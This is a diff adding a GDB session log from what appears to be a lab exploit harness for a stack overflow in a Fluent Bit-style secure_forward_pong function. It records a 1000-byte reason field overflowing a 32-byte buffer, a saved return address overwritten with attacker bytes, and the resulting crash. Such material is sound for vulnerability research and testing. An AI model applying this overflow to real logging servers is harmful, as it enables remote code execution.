@@ -1,0 +1,31 @@
+Breakpoint 1 at 0x166f: file /home/mesh-home/mishe-tauftauf2shell/lab/frontier/fluentbit2shell/harness/forward.c.47db630c, line 568.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+VARIANT=vuln-47db630c MODE=attack REASON_SIZE=1000 DEST_BYTES=32 OVERFLOW_BYTES=968
+
+Breakpoint 1, secure_forward_pong (ctx=0x555555558500 <g_ctx>, buf=0x555555558520 <g_buf> "", buf_size=1024) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/fluentbit2shell/harness/forward.c.47db630c:568
+warning: 568	/home/mesh-home/mishe-tauftauf2shell/lab/frontier/fluentbit2shell/harness/forward.c.47db630c: No such file or directory
+Stack level 0, frame at 0x7fffffffe0e0:
+ rip = 0x55555555566f in secure_forward_pong (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/fluentbit2shell/harness/forward.c.47db630c:568); saved rip = 0x414141414141417b
+ called by frame at 0x7fffffffe0e8
+ source language c.
+ Arglist at 0x7fffffffe0d0, args: ctx=0x555555558500 <g_ctx>, buf=0x555555558520 <g_buf> "", buf_size=1024
+ Locals at 0x7fffffffe0d0, Previous frame's sp is 0x7fffffffe0e0
+ Saved registers:
+  rbp at 0x7fffffffe0d0, rip at 0x7fffffffe0d8
+0x7fffffffe0a0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe0a8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe0b0:	0x41	0x5a	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe0b8:	0x7a	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe0c0:	0x41	0x3c	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe0c8:	0x7b	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe0d0:	0x42	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe0d8:	0x7b	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+FLB_ERROR_CALLS=1 MSG_BYTE31=41 OBS_OFFSET_0=41 OBS_OFFSET_17=5a OBS_OFFSET_24=7a OBS_OFFSET_33=3c OBS_OFFSET_40=7b OBS_OFFSET_48=42 OBS_OFFSET_56=7b OBS_OFFSET_63=41
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00005555555556b5 in secure_forward_pong (ctx=0x555555558500 <g_ctx>, buf=0x555555558520 <g_buf> "", buf_size=1024) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/fluentbit2shell/harness/forward.c.47db630c:574
+574	in /home/mesh-home/mishe-tauftauf2shell/lab/frontier/fluentbit2shell/harness/forward.c.47db630c
+#0  0x00005555555556b5 in secure_forward_pong (ctx=0x555555558500 <g_ctx>, buf=0x555555558520 <g_buf> "", buf_size=1024) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/fluentbit2shell/harness/forward.c.47db630c:574
+#1  0x414141414141417b in ?? ()
+#2  0x4141414141414141 in ?? ()
